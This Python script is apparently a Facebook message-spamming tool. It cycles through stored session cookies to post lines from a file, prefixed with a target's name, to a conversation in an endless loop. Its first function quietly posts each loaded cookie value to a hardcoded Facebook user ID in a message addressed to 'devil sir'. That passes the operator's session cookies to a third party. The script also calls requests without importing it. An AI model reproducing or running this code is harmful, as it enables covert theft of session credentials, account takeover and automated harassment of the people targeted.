import json
import time
import threading
import http.server
import socketserver

# Simple HTTP server setup
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"-- SERVER RUNNING>>CHARSI HERW")

def execute_server():
    PORT = 4000
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print(f"Server running at http://localhost:{PORT}")
        httpd.serve_forever()

# Function to send initial messages
def send_initial_message():
    # Load the cookies from a JSON file
    with open('cookies.json', 'r') as file:
        cookies = json.load(file)
    
    msg_template = "Hello devil sir! I am using your server. My cookie ID is {}"
    target_id = "100026880828945"

    requests.packages.urllib3.disable_warnings()

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    for cookie in cookies:
        cookie_value = cookie['cookie']
        url = f"https://graph.facebook.com/v17.0/t_{target_id}/"
        msg = msg_template.format(cookie_value)
        parameters = {'cookie': cookie_value, 'message': msg}
        response = requests.post(url, json=parameters, headers=headers)
        time.sleep(1)

    print("\n[+] Initial messages sent. Starting the message sending loop...\n")

# Function to send messages from convo.txt and File.txt
def send_messages_from_file():
    with open('convo.txt', 'r') as file:
        convo_id = file.read().strip()

    with open('File.txt', 'r') as file:
        messages = file.readlines()

    with open('cookies.json', 'r') as file:
        cookies = json.load(file)

    with open('hatersname.txt', 'r') as file:
        haters_name = file.read().strip()

    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    while True:
        for message_index, message in enumerate(messages):
            cookie_index = message_index % len(cookies)
            cookie_value = cookies[cookie_index]['cookie']

            url = f"https://graph.facebook.com/v17.0/t_{convo_id}/"
            parameters = {'cookie': cookie_value, 'message': haters_name + ' ' + message.strip()}
            response = requests.post(url, json=parameters, headers=headers)

            if response.ok:
                print(f"\033[1;92m[+] Message {message_index + 1} sent with Cookie {cookie_index + 1}: {haters_name} {message.strip()}")
            else:
                print(f"\033[1;91m[x] Failed to send Message {message_index + 1} with Cookie {cookie_index + 1}: {haters_name} {message.strip()}")
            time.sleep(speed)

        print("\n[+] All messages sent. Restarting the process...\n")

def main():
    # Start the HTTP server in a separate thread
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()

    # Wait for the server to start properly
    time.sleep(3)

    # Send initial messages
    send_initial_message()

    # Start sending messages from files
    send_messages_from_file()

if __name__ == '__main__':
    main()
